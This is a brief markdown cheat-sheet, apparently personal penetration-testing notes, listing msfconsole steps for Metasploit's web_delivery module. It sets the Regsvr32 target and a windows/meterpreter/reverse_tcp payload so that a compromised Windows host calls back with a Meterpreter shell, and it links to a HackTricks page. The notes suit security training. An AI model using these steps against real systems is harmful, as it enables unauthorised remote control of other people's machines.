# Metasploit
#### **web_delivery** module
1. Select module
   * `use exploit/multi/script/web_delivery`
2. set `lhost`
3. set target
   * `show targets`
   * `set target Regsvr32` - creates a payload to run on windows
4. set payload
   * `set payload windows/meterpreter/reverse_tcp`
5. Run command on already infected host to gain **Meterpreter** shell

## Cool resources
https://book.hacktricks.xyz/shells/shells/windows#regsvr32